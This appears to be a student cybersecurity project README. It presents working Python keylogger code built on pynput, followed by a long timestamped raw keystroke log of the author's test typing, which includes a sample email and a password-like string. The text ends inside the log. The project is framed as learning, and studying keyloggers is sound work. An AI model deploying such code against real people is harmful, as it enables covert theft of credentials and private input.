# Keystroke Log Analyzer with Word Extraction and Pattern Detection

In this project, I created a keylogger to capture keystrokes and a script to analyze the logged data. 
The script reconstructs the keystrokes into readable text and identifies patterns like common words, URLs, emails, and passwords, making it easier to extract useful information.
       
---

## What I learned from this project?

Through this project, I gained several key insights that will benefit my future career as a cybersecurity analyst. One critical takeaway was understanding the security
implications of how straightforward it is to create and implement a keylogger. Keyloggers are relatively easy to develop or acquire, and a threat actor merely needs to
deploy a payload for the victim to execute the script, which can often evade detection.

Additionally, this project deepened my proficiency in Python, particularly through the use of libraries like pynput for capturing keystrokes and re for regex-based pattern matching. 
As I progressed, I found myself continuously expanding the functionality of the script. Initially focused on detecting common words and URLs, I later incorporated features to recognize emails and potential passwords.

Looking ahead, there are several enhancements I'm considering, such as encrypting output files, conducting more detailed analysis of typing patterns, and expanding pattern recognition capabilities. 
These additions could further improve the project's scope and relevance to real-world cybersecurity challenges.

---

## How does this project work?

This project consists of two key components: a keylogger for capturing keyboard input and an analysis script for processing the captured data. 

The keylogger is designed to record all keyboard activity and log it to a file, raw_log.txt, along with timestamps. When activated, it initializes
the log file by noting the start time and records each key pressed, including handling special keys like spaces, backspaces, and other non-character keys.
The keylogger continues capturing input until the esc key is pressed, which serves as the stop mechanism.

Below is the code for the keylogger in Python:
```
from pynput.keyboard import Listener
import time
import os

# File to extract logs into
log_file = "raw_log.txt"

# Check if file exists, then creats/writes into the file. Extracting the time when the keylogger is activated
if not os.path.exists(log_file):
    with open(log_file, "w") as file:
        file.write("Keylogger started at: {}\n".format(time.ctime()))

# Function called with every key pressed, logs it into file with that current timestamp
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write("{0} - {1}\n".format(time.ctime(), key.char))
    except AttributeError:
        with open(log_file, "a") as file:
            file.write("{0} - {1}\n".format(time.ctime(), key))
        
        # Break zone, when esc key is entered, the keylogger stops
        if key == key.esc:
            return False

# Enables input from keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
```

---

Here is then the extracted raw data that the script retrieved:
<details>
    <summary>Raw Data</summary>

    Keylogger started at: Fri Dec 13 16:32:25 2024
    Fri Dec 13 16:32:27 2024 - Key.shift_r
    Fri Dec 13 16:32:28 2024 - T
    Fri Dec 13 16:32:28 2024 - h
    Fri Dec 13 16:32:28 2024 - i
    Fri Dec 13 16:32:28 2024 - s
    Fri Dec 13 16:32:28 2024 - Key.space
    Fri Dec 13 16:32:29 2024 - i
    Fri Dec 13 16:32:29 2024 - s
    Fri Dec 13 16:32:29 2024 - Key.space
    Fri Dec 13 16:32:29 2024 - a
    Fri Dec 13 16:32:29 2024 - Key.space
    Fri Dec 13 16:32:30 2024 - k
    Fri Dec 13 16:32:30 2024 - e
    Fri Dec 13 16:32:30 2024 - y
    Fri Dec 13 16:32:30 2024 - l
    Fri Dec 13 16:32:30 2024 - o
    Fri Dec 13 16:32:31 2024 - g
    Fri Dec 13 16:32:31 2024 - g
    Fri Dec 13 16:32:31 2024 - e
    Fri Dec 13 16:32:31 2024 - r
    Fri Dec 13 16:32:31 2024 - Key.space
    Fri Dec 13 16:32:32 2024 - t
    Fri Dec 13 16:32:32 2024 - e
    Fri Dec 13 16:32:32 2024 - s
    Fri Dec 13 16:32:32 2024 - t
    Fri Dec 13 16:32:33 2024 - ,
    Fri Dec 13 16:32:33 2024 - Key.space
    Fri Dec 13 16:32:33 2024 - t
    Fri Dec 13 16:32:33 2024 - h
    Fri Dec 13 16:32:34 2024 - i
    Fri Dec 13 16:32:34 2024 - s
    Fri Dec 13 16:32:34 2024 - Key.space
    Fri Dec 13 16:32:34 2024 - i
    Fri Dec 13 16:32:34 2024 - s
    Fri Dec 13 16:32:34 2024 - Key.space
    Fri Dec 13 16:32:35 2024 - a
    Fri Dec 13 16:32:35 2024 - l
    Fri Dec 13 16:32:35 2024 - l
    Fri Dec 13 16:32:35 2024 - Key.space
    Fri Dec 13 16:32:35 2024 - b
    Fri Dec 13 16:32:35 2024 - e
    Fri Dec 13 16:32:36 2024 - i
    Fri Dec 13 16:32:36 2024 - n
    Fri Dec 13 16:32:36 2024 - g
    Fri Dec 13 16:32:36 2024 - f
    Fri Dec 13 16:32:36 2024 - Key.space
    Fri Dec 13 16:32:37 2024 - Key.backspace
    Fri Dec 13 16:32:37 2024 - Key.backspace
    Fri Dec 13 16:32:37 2024 - Key.space
    Fri Dec 13 16:32:38 2024 - l
    Fri Dec 13 16:32:38 2024 - o
    Fri Dec 13 16:32:38 2024 - g
    Fri Dec 13 16:32:38 2024 - g
    Fri Dec 13 16:32:38 2024 - e
    Fri Dec 13 16:32:39 2024 - d
    Fri Dec 13 16:32:39 2024 - Key.space
    Fri Dec 13 16:32:39 2024 - f
    Fri Dec 13 16:32:39 2024 - d
    Fri Dec 13 16:32:40 2024 - Key.backspace
    Fri Dec 13 16:32:40 2024 - r
    Fri Dec 13 16:32:40 2024 - o
    Fri Dec 13 16:32:41 2024 - m
    Fri Dec 13 16:32:41 2024 - Key.space
    Fri Dec 13 16:32:41 2024 - a
    Fri Dec 13 16:32:41 2024 - Key.space
    Fri Dec 13 16:32:42 2024 - k
    Fri Dec 13 16:32:42 2024 - e
    Fri Dec 13 16:32:42 2024 - y
    Fri Dec 13 16:32:43 2024 - l
    Fri Dec 13 16:32:43 2024 - o
    Fri Dec 13 16:32:43 2024 - g
    Fri Dec 13 16:32:43 2024 - g
    Fri Dec 13 16:32:44 2024 - e
    Fri Dec 13 16:32:44 2024 - r
    Fri Dec 13 16:32:45 2024 - .
    Fri Dec 13 16:32:45 2024 - Key.space
    Fri Dec 13 16:32:45 2024 - Key.shift_r
    Fri Dec 13 16:32:45 2024 - T
    Fri Dec 13 16:32:45 2024 - h
    Fri Dec 13 16:32:45 2024 - i
    Fri Dec 13 16:32:46 2024 - s
    Fri Dec 13 16:32:46 2024 - Key.space
    Fri Dec 13 16:32:46 2024 - k
    Fri Dec 13 16:32:46 2024 - e
    Fri Dec 13 16:32:46 2024 - y
    Fri Dec 13 16:32:47 2024 - l
    Fri Dec 13 16:32:47 2024 - o
    Fri Dec 13 16:32:47 2024 - g
    Fri Dec 13 16:32:47 2024 - g
    Fri Dec 13 16:32:47 2024 - e
    Fri Dec 13 16:32:48 2024 - r
    Fri Dec 13 16:32:48 2024 - Key.space
    Fri Dec 13 16:32:48 2024 - w
    Fri Dec 13 16:32:48 2024 - i
    Fri Dec 13 16:32:49 2024 - l
    Fri Dec 13 16:32:49 2024 - l
    Fri Dec 13 16:32:49 2024 - Key.space
    Fri Dec 13 16:32:50 2024 - p
    Fri Dec 13 16:32:50 2024 - i
    Fri Dec 13 16:32:50 2024 - c
    Fri Dec 13 16:32:51 2024 - k
    Fri Dec 13 16:32:51 2024 - Key.space
    Fri Dec 13 16:32:51 2024 - u
    Fri Dec 13 16:32:51 2024 - p
    Fri Dec 13 16:32:51 2024 - Key.space
    Fri Dec 13 16:32:51 2024 - e
    Fri Dec 13 16:32:52 2024 - v
    Fri Dec 13 16:32:52 2024 - e
    Fri Dec 13 16:32:52 2024 - r
    Fri Dec 13 16:32:52 2024 - y
    Fri Dec 13 16:32:52 2024 - Key.space
    Fri Dec 13 16:32:53 2024 - k
    Fri Dec 13 16:32:53 2024 - e
    Fri Dec 13 16:32:53 2024 - y
    Fri Dec 13 16:32:53 2024 - Key.space
    Fri Dec 13 16:32:53 2024 - s
    Fri Dec 13 16:32:53 2024 - t
    Fri Dec 13 16:32:54 2024 - r
    Fri Dec 13 16:32:54 2024 - o
    Fri Dec 13 16:32:54 2024 - k
    Fri Dec 13 16:32:54 2024 - e
    Fri Dec 13 16:32:55 2024 - .
    Fri Dec 13 16:32:56 2024 - Key.space
    Fri Dec 13 16:32:56 2024 - Key.shift_r
    Fri Dec 13 16:32:56 2024 - T
    Fri Dec 13 16:32:56 2024 - h
    Fri Dec 13 16:32:56 2024 - a
    Fri Dec 13 16:32:56 2024 - t
    Fri Dec 13 16:32:57 2024 - Key.space
    Fri Dec 13 16:32:57 2024 - i
    Fri Dec 13 16:32:57 2024 - s
    Fri Dec 13 16:32:57 2024 - Key.space
    Fri Dec 13 16:32:57 2024 - s
    Fri Dec 13 16:32:58 2024 - c
    Fri Dec 13 16:32:58 2024 - a
    Fri Dec 13 16:32:58 2024 - r
    Fri Dec 13 16:32:58 2024 - y
    Fri Dec 13 16:32:59 2024 - Key.shift_r
    Fri Dec 13 16:32:59 2024 - !
    Fri Dec 13 16:33:00 2024 - Key.space
    Fri Dec 13 16:33:00 2024 - Key.shift_r
    Fri Dec 13 16:33:00 2024 - T
    Fri Dec 13 16:33:00 2024 - h
    Fri Dec 13 16:33:01 2024 - e
    Fri Dec 13 16:33:01 2024 - n
    Fri Dec 13 16:33:01 2024 - Key.space
    Fri Dec 13 16:33:01 2024 - i
    Fri Dec 13 16:33:01 2024 - t
    Fri Dec 13 16:33:01 2024 - Key.space
    Fri Dec 13 16:33:01 2024 - w
    Fri Dec 13 16:33:02 2024 - i
    Fri Dec 13 16:33:02 2024 - l
    Fri Dec 13 16:33:02 2024 - l
    Fri Dec 13 16:33:02 2024 - Key.space
    Fri Dec 13 16:33:03 2024 - b
    Fri Dec 13 16:33:03 2024 - e
    Fri Dec 13 16:33:03 2024 - Key.space
    Fri Dec 13 16:33:03 2024 - a
    Fri Dec 13 16:33:03 2024 - l
    Fri Dec 13 16:33:04 2024 - a
    Fri Dec 13 16:33:04 2024 - y
    Fri Dec 13 16:33:05 2024 - z
    Fri Dec 13 16:33:05 2024 - e
    Fri Dec 13 16:33:05 2024 - d
    Fri Dec 13 16:33:08 2024 - Key.backspace
    Fri Dec 13 16:33:08 2024 - Key.backspace
    Fri Dec 13 16:33:08 2024 - Key.backspace
    Fri Dec 13 16:33:08 2024 - Key.backspace
    Fri Dec 13 16:33:08 2024 - Key.backspace
    Fri Dec 13 16:33:09 2024 - Key.backspace
    Fri Dec 13 16:33:09 2024 - n
    Fri Dec 13 16:33:09 2024 - a
    Fri Dec 13 16:33:09 2024 - l
    Fri Dec 13 16:33:10 2024 - y
    Fri Dec 13 16:33:11 2024 - z
    Fri Dec 13 16:33:11 2024 - e
    Fri Dec 13 16:33:11 2024 - d
    Fri Dec 13 16:33:12 2024 - .
    Fri Dec 13 16:33:12 2024 - Key.space
    Fri Dec 13 16:33:16 2024 - Key.shift_r
    Fri Dec 13 16:33:16 2024 - H
    Fri Dec 13 16:33:16 2024 - o
    Fri Dec 13 16:33:16 2024 - p
    Fri Dec 13 16:33:17 2024 - e
    Fri Dec 13 16:33:17 2024 - f
    Fri Dec 13 16:33:17 2024 - u
    Fri Dec 13 16:33:17 2024 - l
    Fri Dec 13 16:33:17 2024 - l
    Fri Dec 13 16:33:17 2024 - y
    Fri Dec 13 16:33:18 2024 - Key.space
    Fri Dec 13 16:33:19 2024 - Key.shift_r
    Fri Dec 13 16:33:19 2024 - I
    Fri Dec 13 16:33:19 2024 - Key.space
    Fri Dec 13 16:33:19 2024 - d
    Fri Dec 13 16:33:19 2024 - o
    Fri Dec 13 16:33:20 2024 - n
    Fri Dec 13 16:33:20 2024 - '
    Fri Dec 13 16:33:20 2024 - t
    Fri Dec 13 16:33:20 2024 - Key.space
    Fri Dec 13 16:33:21 2024 - g
    Fri Dec 13 16:33:21 2024 - o
    Fri Dec 13 16:33:21 2024 - Key.space
    Fri Dec 13 16:33:21 2024 - t
    Fri Dec 13 16:33:21 2024 - o
    Fri Dec 13 16:33:21 2024 - Key.space
    Fri Dec 13 16:33:22 2024 - a
    Fri Dec 13 16:33:22 2024 - Key.space
    Fri Dec 13 16:33:22 2024 - w
    Fri Dec 13 16:33:23 2024 - e
    Fri Dec 13 16:33:23 2024 - b
    Fri Dec 13 16:33:23 2024 - s
    Fri Dec 13 16:33:23 2024 - i
    Fri Dec 13 16:33:24 2024 - t
    Fri Dec 13 16:33:24 2024 - e
    Fri Dec 13 16:33:25 2024 - Key.space
    Fri Dec 13 16:33:25 2024 - l
    Fri Dec 13 16:33:26 2024 - i
    Fri Dec 13 16:33:26 2024 - k
    Fri Dec 13 16:33:26 2024 - e
    Fri Dec 13 16:33:26 2024 - Key.space
    Fri Dec 13 16:33:26 2024 - Key.shift_r
    Fri Dec 13 16:33:26 2024 - T
    Fri Dec 13 16:33:27 2024 - y
    Fri Dec 13 16:33:27 2024 - Key.backspace
    Fri Dec 13 16:33:27 2024 - r
    Fri Dec 13 16:33:27 2024 - y
    Fri Dec 13 16:33:28 2024 - Key.shift_r
    Fri Dec 13 16:33:28 2024 - H
    Fri Dec 13 16:33:28 2024 - a
    Fri Dec 13 16:33:28 2024 - c
    Fri Dec 13 16:33:29 2024 - k
    Fri Dec 13 16:33:29 2024 - Key.shift_r
    Fri Dec 13 16:33:29 2024 - M
    Fri Dec 13 16:33:29 2024 - e
    Fri Dec 13 16:33:31 2024 - .
    Fri Dec 13 16:33:31 2024 - c
    Fri Dec 13 16:33:32 2024 - o
    Fri Dec 13 16:33:32 2024 - m
    Fri Dec 13 16:33:32 2024 - Key.space
    Fri Dec 13 16:33:33 2024 - a
    Fri Dec 13 16:33:33 2024 - n
    Fri Dec 13 16:33:33 2024 - d
    Fri Dec 13 16:33:33 2024 - Key.space
    Fri Dec 13 16:33:34 2024 - t
    Fri Dec 13 16:33:34 2024 - y
    Fri Dec 13 16:33:34 2024 - p
    Fri Dec 13 16:33:34 2024 - e
    Fri Dec 13 16:33:34 2024 - Key.space
    Fri Dec 13 16:33:35 2024 - i
    Fri Dec 13 16:33:35 2024 - n
    Fri Dec 13 16:33:35 2024 - Key.space
    Fri Dec 13 16:33:36 2024 - m
    Fri Dec 13 16:33:36 2024 - y
    Fri Dec 13 16:33:36 2024 - Key.space
    Fri Dec 13 16:33:37 2024 - c
    Fri Dec 13 16:33:37 2024 - r
    Fri Dec 13 16:33:37 2024 - e
    Fri Dec 13 16:33:37 2024 - d
    Fri Dec 13 16:33:37 2024 - e
    Fri Dec 13 16:33:38 2024 - n
    Fri Dec 13 16:33:38 2024 - t
    Fri Dec 13 16:33:38 2024 - i
    Fri Dec 13 16:33:38 2024 - a
    Fri Dec 13 16:33:38 2024 - l
    Fri Dec 13 16:33:38 2024 - s
    Fri Dec 13 16:33:39 2024 - .
    Fri Dec 13 16:33:39 2024 - Key.space
    Fri Dec 13 16:33:41 2024 - Key.shift_r
    Fri Dec 13 16:33:42 2024 - W
    Fri Dec 13 16:33:42 2024 - h
    Fri Dec 13 16:33:42 2024 - i
    Fri Dec 13 16:33:42 2024 - c
    Fri Dec 13 16:33:42 2024 - h
    Fri Dec 13 16:33:42 2024 - Key.space
    Fri Dec 13 16:33:43 2024 - b
    Fri Dec 13 16:33:43 2024 - e
    Fri Dec 13 16:33:43 2024 - i
    Fri Dec 13 16:33:43 2024 - n
    Fri Dec 13 16:33:43 2024 - g
    Fri Dec 13 16:33:43 2024 - Key.space
    Fri Dec 13 16:33:45 2024 - k
    Fri Dec 13 16:33:45 2024 - e
    Fri Dec 13 16:33:45 2024 - y
    Fri Dec 13 16:33:46 2024 - l
    Fri Dec 13 16:33:46 2024 - o
    Fri Dec 13 16:33:46 2024 - g
    Fri Dec 13 16:33:46 2024 - g
    Fri Dec 13 16:33:47 2024 - o
    Fri Dec 13 16:33:47 2024 - Key.backspace
    Fri Dec 13 16:33:47 2024 - e
    Fri Dec 13 16:33:48 2024 - d
    Fri Dec 13 16:33:48 2024 - Key.shift_r
    Fri Dec 13 16:33:49 2024 - Key.shift_r
    Fri Dec 13 16:33:49 2024 - Key.shift_r
    Fri Dec 13 16:33:49 2024 - @
    Fri Dec 13 16:33:49 2024 - e
    Fri Dec 13 16:33:50 2024 - x
    Fri Dec 13 16:33:50 2024 - a
    Fri Dec 13 16:33:50 2024 - m
    Fri Dec 13 16:33:50 2024 - p
    Fri Dec 13 16:33:50 2024 - l
    Fri Dec 13 16:33:51 2024 - e
    Fri Dec 13 16:33:51 2024 - .
    Fri Dec 13 16:33:51 2024 - c
    Fri Dec 13 16:33:51 2024 - o
    Fri Dec 13 16:33:51 2024 - m
    Fri Dec 13 16:33:54 2024 - Key.space
    Fri Dec 13 16:33:54 2024 - a
    Fri Dec 13 16:33:55 2024 - n
    Fri Dec 13 16:33:55 2024 - d
    Fri Dec 13 16:33:55 2024 - Key.space
    Fri Dec 13 16:33:55 2024 - m
    Fri Dec 13 16:33:56 2024 - y
    Fri Dec 13 16:33:56 2024 - Key.space
    Fri Dec 13 16:33:57 2024 - p
    Fri Dec 13 16:33:57 2024 - a
    Fri Dec 13 16:33:57 2024 - s
    Fri Dec 13 16:33:57 2024 - s
    Fri Dec 13 16:33:57 2024 - w
    Fri Dec 13 16:33:57 2024 - o
    Fri Dec 13 16:33:57 2024 - r
    Fri Dec 13 16:33:58 2024 - d
    Fri Dec 13 16:33:58 2024 - Key.space
    Fri Dec 13 16:34:01 2024 - b
    Fri Dec 13 16:34:01 2024 - e
    Fri Dec 13 16:34:02 2024 - i
    Fri Dec 13 16:34:02 2024 - n
    Fri Dec 13 16:34:02 2024 - g
    Fri Dec 13 16:34:02 2024 - Key.space
    Fri Dec 13 16:34:02 2024 - Key.shift_r
    Fri Dec 13 16:34:02 2024 - P
    Fri Dec 13 16:34:04 2024 - 2
    Fri Dec 13 16:34:05 2024 - Key.backspace
    Fri Dec 13 16:34:05 2024 - Key.shift_r
    Fri Dec 13 16:34:05 2024 - @
    Fri Dec 13 16:34:06 2024 - Key.shift_r
    Fri Dec 13 16:34:06 2024 - $
    Fri Dec 13 16:34:06 2024 - $
    Fri Dec 13 16:34:07 2024 - Key.shift_r
    Fri Dec 13 16:34:07 2024 - W
    Fri Dec 13 16:34:09 2024 - Key.shift_r
    Fri Dec 13 16:34:09 2024 - 0
    Fri Dec 13 16:34:10 2024 - r
    Fri Dec 13 16:34:10 2024 - d
    Fri Dec 13 16:34:11 2024 - Key.shift_r
    Fri Dec 13 16:34:11 2024 - !
    Fri Dec 13 16:34:12 2024 - 9
    Fri Dec 13 16:34:13 2024 - 9
    Fri Dec 13 16:34:14 2024 - Key.space
    Fri Dec 13 16:34:14 2024 - f
    Fri Dec 13 16:34:14 2024 - o
    Fri Dec 13 16:34:15 2024 - r
    Fri Dec 13 16:34:15 2024 - Key.space
    Fri Dec 13 16:34:15 2024 - t
    Fri Dec 13 16:34:15 2024 - h
    Fri Dec 13 16:34:15 2024 - e
    Fri Dec 13 16:34:15 2024 - Key.space
    Fri Dec 13 16:34:15 2024 - w
    Fri Dec 13 16:34:16 2024 - e
    Fri Dec 13 16:34:16 2024 - b
    Fri Dec 13 16:34:16 2024 - s
    Fri Dec 13 16:34:16 2024 - i
    Fri Dec 13 16:34:16 2024 - t
    Fri Dec 13 16:34:17 2024 - e
    Fri Dec 13 16:34:17 2024 - .
    Fri Dec 13 16:34:23 2024 - Key.space
    Fri Dec 13 16:34:23 2024 - Key.shift_r
    Fri Dec 13 16:34:23 2024 - T
    Fri Dec 13 16:34:24 2024 - h
    Fri Dec 13 16:34:24 2024 - a
    Fri Dec 13 16:34:24 2024 - t
    Fri Dec 13 16:34:24 2024 - Key.space
    Fri Dec 13 16:34:27 2024 - k
    Fri Dec 13 16:34:27 2024 - e
    Fri Dec 13 16:34:27 2024 - y
    Fri Dec 13 16:34:27 2024 - l
    Fri Dec 13 16:34:27 2024 - o
    Fri Dec 13 16:34:28 2024 - g
    Fri Dec 13 16:34:28 2024 - g
    Fri Dec 13 16:34:28 2024 - e
    Fri Dec 13 16:34:28 2024 - r
    Fri Dec 13 16:34:28 2024 - Key.space
    Fri Dec 13 16:34:29 2024 - w
    Fri Dec 13 16:34:29 2024 - i
    Fri Dec 13 16:34:29 2024 - l
    Fri Dec 13 16:34:29 2024 - l
    Fri Dec 13 16:34:30 2024 - Key.space
    Fri Dec 13 16:34:30 2024 - l
    Fri Dec 13 16:34:30 2024 - o
    Fri Dec 13 16:34:30 2024 - g
    Fri Dec 13 16:34:30 2024 - Key.space
    Fri Dec 13 16:34:31 2024 - t
    Fri Dec 13 16:34:32 2024 - h
    Fri Dec 13 16:34:32 2024 - a
    Fri Dec 13 16:34:32 2024 - t
    Fri Dec 13 16:34:32 2024 - Key.space
    Fri Dec 13 16:34:32 2024 - i
    Fri Dec 13 16:34:33 2024 - n
    Fri Dec 13 16:34:33 2024 - Key.space
    Fri Dec 13 16:34:33 2024 - a
    Fri Dec 13 16:34:33 2024 - n
    Fri Dec 13 16:34:33 2024 - d
    Fri Dec 13 16:34:33 2024 - Key.space
    Fri Dec 13 16:34:36 2024 - m
    Fri Dec 13 16:34:36 2024 - i
    Fri Dec 13 16:34:36 2024 - g
    Fri Dec 13 16:34:37 2024 - h
    Fri Dec 13 16:34:37 2024 - t
    Fri Dec 13 16:34:37 2024 - Key.space
    Fri Dec 13 16:34:37 2024 - f
    Fri Dec 13 16:34:37 2024 - i
    Fri Dec 13 16:34:38 2024 - n
    Fri Dec 13 16:34:38 2024 - d
    Fri Dec 13 16:34:38 2024 - Key.space
    Fri Dec 13 16:34:39 2024 - a
    Fri Dec 13 16:34:39 2024 - Key.space
    Fri Dec 13 16:34:40 2024 - t
    Fri Dec 13 16:34:40 2024 - u
    Fri Dec 13 16:34:40 2024 - t
    Fri Dec 13 16:34:41 2024 - o
    Fri Dec 13 16:34:41 2024 - r
    Fri Dec 13 16:34:41 2024 - i
    Fri Dec 13 16:34:41 2024 - a
    Fri Dec 13 16:34:41 2024 - l
    Fri Dec 13 16:34:41 2024 - Key.space
    Fri Dec 13 16:34:43 2024 - f
    Fri Dec 13 16:34:43 2024 - o
    Fri Dec 13 16:34:43 2024 - r
    Fri Dec 13 16:34:43 2024 - Key.space
    Fri Dec 13 16:34:43 2024 - a
    Fri Dec 13 16:34:43 2024 - Key.space
    Fri Dec 13 16:34:44 2024 - t
    Fri Dec 13 16:34:44 2024 - r
    Fri Dec 13 16:34:44 2024 - y
    Fri Dec 13 16:34:44 2024 - h
    Fri Dec 13 16:34:44 2024 - a
    Fri Dec 13 16:34:45 2024 - c
    Fri Dec 13 16:34:45 2024 - k
    Fri Dec 13 16:34:45 2024 - m
    Fri Dec 13 16:34:45 2024 - e
    Fri Dec 13 16:34:47 2024 - Key.space
    Fri Dec 13 16:34:47 2024 - r
    Fri Dec 13 16:34:47 2024 - o
    Fri Dec 13 16:34:47 2024 - o
    Fri Dec 13 16:34:47 2024 - m
    Fri Dec 13 16:34:48 2024 - Key.space
    Fri Dec 13 16:34:48 2024 - o
    Fri Dec 13 16:34:48 2024 - n
    Fri Dec 13 16:34:48 2024 - Key.space
    Fri Dec 13 16:34:48 2024 - y
    Fri Dec 13 16:34:49 2024 - o
    Fri Dec 13 16:34:49 2024 - u
    Fri Dec 13 16:34:49 2024 - t
    Fri Dec 13 16:34:49 2024 - u
    Fri Dec 13 16:34:50 2024 - b
    Fri Dec 13 16:34:50 2024 - e
    Fri Dec 13 16:34:51 2024 - .
    Fri Dec 13 16:34:51 2024 - c
    Fri Dec 13 16:34:52 2024 - o
    Fri Dec 13 16:34:52 2024 - m
    Fri Dec 13 16:34:55 2024 - Key.space
    Fri Dec 13 16:34:56 2024 - w
    Fri Dec 13 16:34:56 2024 - i
    Fri Dec 13 16:34:56 2024 - t
    Fri Dec 13 16:34:56 2024 - h
    Fri Dec 13 16:34:56 2024 - Key.space
    Fri Dec 13 16:34:59 2024 - m
    Fri Dec 13 16:35:00 2024 - y
    Fri Dec 13 16:35:00 2024 - Key.space
    Fri Dec 13 16:35:00 2024 - a
    Fri Dec 13 16:35:00 2024 - c
    Fri Dec 13 16:35:00 2024 - c
    Fri Dec 13 16:35:00 2024 - o
    Fri Dec 13 16:35:01 2024 - u
    Fri Dec 13 16:35:01 2024 - n
    Fri Dec 13 16:35:01 2024 - t
    Fri Dec 13 16:35:08 2024 - Key.shift_r
    Fri Dec 13 16:35:08 2024 - !
    Fri Dec 13 16:35:09 2024 - Key.space
    Fri Dec 13 16:35:09 2024 - Key.shift_r
    Fri Dec 13 16:35:10 2024 - M
    Fri Dec 13 16:35:10 2024 - i
    Fri Dec 13 16:35:10 2024 - g
    Fri Dec 13 16:35:10 2024 - h
    Fri Dec 13 16:35:10 2024 - t
    Fri Dec 13 16:35:10 2024 - Key.space
    Fri Dec 13 16:35:10 2024 - h
    Fri Dec 13 16:35:11 2024 - a
    Fri Dec 13 16:35:11 2024 - c
    Fri Dec 13 16:35:11 2024 - v
    Fri Dec 13 16:35:12 2024 - Key.backspace
    Fri Dec 13 16:35:12 2024 - Key.backspace
    Fri Dec 13 16:35:12 2024 - v
    Fri Dec 13 16:35:12 2024 - e
    Fri Dec 13 16:35:13 2024 - Key.space
    Fri Dec 13 16:35:13 2024 - t
    Fri Dec 13 16:35:13 2024 - o
    Fri Dec 13 16:35:13 2024 - Key.space
    Fri Dec 13 16:35:13 2024 - e
    Fri Dec 13 16:35:13 2024 - m
    Fri Dec 13 16:35:13 2024 - a
    Fri Dec 13 16:35:14 2024 - u
    Fri Dec 13 16:35:14 2024 - Key.backspace
    Fri Dec 13 16:35:15 2024 - i
    Fri Dec 13 16:35:15 2024 - l
    Fri Dec 13 16:35:15 2024 - Key.space
    Fri Dec 13 16:35:17 2024 - t
    Fri Dec 13 16:35:17 2024 - r
    Fri Dec 13 16:35:17 2024 - y
    Fri Dec 13 16:35:18 2024 - h
    Fri Dec 13 16:35:18 2024 - a
    Fri Dec 13 16:35:18 2024 - c
    Fri Dec 13 16:35:18 2024 - k
    Fri Dec 13 16:35:18 2024 - m
    Fri Dec 13 16:35:19 2024 - e
    Fri Dec 13 16:35:19 2024 - Key.shift_r
    Fri Dec 13 16:35:20 2024 - Key.shift_r
    Fri Dec 13 16:35:20 2024 - Key.shift_r
    Fri Dec 13 16:35:20 2024 - Key.shift_r
    Fri Dec 13 16:35:20 2024 - Key.shift_r
    Fri Dec 13 16:35:20 2024 - Key.shift_r
    Fri Dec 13 16:35:20 2024 - Key.shift_r
    Fri Dec 13 16:35:20 2024 - Key.shift_r
    Fri Dec 13 16:35:20 2024 - @
    Fri Dec 13 16:35:20 2024 - s
    Fri Dec 13 16:35:21 2024 - u
    Fri Dec 13 16:35:21 2024 - p
    Fri Dec 13 16:35:21 2024 - p
    Fri Dec 13 16:35:21 2024 - o
    Fri Dec 13 16:35:21 2024 - r
    Fri Dec 13 16:35:22 2024 - t
    Fri Dec 13 16:35:22 2024 - .
    Fri Dec 13 16:35:22 2024 - c
    Fri Dec 13 16:35:22 2024 - o
    Fri Dec 13 16:35:23 2024 - m
    Fri Dec 13 16:35:23 2024 - Key.space
    Fri Dec 13 16:35:23 2024 - o
    Fri Dec 13 16:35:23 2024 - r
    Fri Dec 13 16:35:23 2024 - Key.space
    Fri Dec 13 16:35:24 2024 - g
    Fri Dec 13 16:35:24 2024 - o
    Fri Dec 13 16:35:24 2024 - Key.space
    Fri Dec 13 16:35:25 2024 - t
    Fri Dec 13 16:35:25 2024 - o
    Fri Dec 13 16:35:25 2024 - Key.space
    Fri Dec 13 16:35:25 2024 - t
    Fri Dec 13 16:35:25 2024 - h
    Fri Dec 13 16:35:25 2024 - e
    Fri Dec 13 16:35:25 2024 - i
    Fri Dec 13 16:35:26 2024 - r
    Fri Dec 13 16:35:26 2024 - Key.space
    Fri Dec 13 16:35:27 2024 - w
    Fri Dec 13 16:35:28 2024 - e
    Fri Dec 13 16:35:28 2024 - b
    Fri Dec 13 16:35:28 2024 - s
    Fri Dec 13 16:35:28 2024 - i
    Fri Dec 13 16:35:29 2024 - t
    Fri Dec 13 16:35:29 2024 - e
    Fri Dec 13 16:35:29 2024 - Key.space
    Fri Dec 13 16:35:30 2024 - t
    Fri Dec 13 16:35:30 2024 - r
    Fri Dec 13 16:35:30 2024 - y
    Fri Dec 13 16:35:30 2024 - a
    Fri Dec 13 16:35:30 2024 - Key.backspace
    Fri Dec 13 16:35:31 2024 - h
    Fri Dec 13 16:35:31 2024 - a
    Fri Dec 13 16:35:33 2024 - c
    Fri Dec 13 16:35:33 2024 - k
    Fri Dec 13 16:35:36 2024 - Key.backspace
    Fri Dec 13 16:35:36 2024 - Key.backspace
    Fri Dec 13 16:35:37 2024 - Key.backspace
    Fri Dec 13 16:35:37 2024 - Key.backspace
    Fri Dec 13 16:35:37 2024 - Key.backspace
    Fri Dec 13 16:35:37 2024 - Key.backspace
    Fri Dec 13 16:35:38 2024 - Key.backspace
    Fri Dec 13 16:35:38 2024 - Key.backspace
    Fri Dec 13 16:35:38 2024 - Key.backspace
    Fri Dec 13 16:35:38 2024 - Key.backspace
    Fri Dec 13 16:35:38 2024 - Key.backspace
    Fri Dec 13 16:35:39 2024 - Key.backspace
    Fri Dec 13 16:35:39 2024 - Key.backspace
    Fri Dec 13 16:35:39 2024 - Key.backspace
    Fri Dec 13 16:35:39 2024 - Key.backspace
    Fri Dec 13 16:35:39 2024 - Key.backspace
    Fri Dec 13 16:35:39 2024 - Key.backspace
    Fri Dec 13 16:35:39 2024 - Key.backspace
    Fri Dec 13 16:35:39 2024 - Key.backspace
    Fri Dec 13 16:35:39 2024 - Key.backspace
    Fri Dec 13 16:35:39 2024 - Key.backspace
    Fri Dec 13 16:35:39 2024 - Key.backspace
    Fri Dec 13 16:35:40 2024 - Key.space
    Fri Dec 13 16:35:40 2024 - k
    Fri Dec 13 16:35:40 2024 - e
    Fri Dec 13 16:35:41 2024 - y
    Fri Dec 13 16:35:41 2024 - l
    Fri Dec 13 16:35:41 2024 - o
    Fri Dec 13 16:35:42 2024 - g
    Fri Dec 13 16:35:43 2024 - g
    Fri Dec 13 16:35:43 2024 - e
    Fri Dec 13 16:35:44 2024 - Key.backspace
    Fri Dec 13 16:35:44 2024 - Key.backspace
    Fri Dec 13 16:35:44 2024 - Key.backspace
    Fri Dec 13 16:35:45 2024 - Key.backspace
